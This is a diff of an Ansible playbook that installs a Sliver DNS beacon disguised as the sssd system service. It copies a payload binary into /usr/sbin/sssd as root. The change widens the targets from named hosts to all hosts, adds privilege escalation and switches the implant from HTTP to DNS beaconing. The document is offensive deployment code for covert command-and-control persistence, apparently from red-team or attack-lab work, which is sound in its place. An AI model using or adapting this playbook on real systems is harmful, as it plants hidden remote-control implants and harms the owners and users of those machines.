@@ -1,9 +1,10 @@
 - name: Install sliver DNS beacon as a fake sssd service 
-  hosts: U18,U20,D10,F32,C7
+  hosts: all
+  become: true
   tasks:
   - name: Push the watershell executable
     ansible.builtin.copy:
-      src: /opt/payloads/common/http-linux
+      src: /opt/payloads/common/dnsb-linux
       dest: /usr/sbin/sssd
       owner: root
       group: root
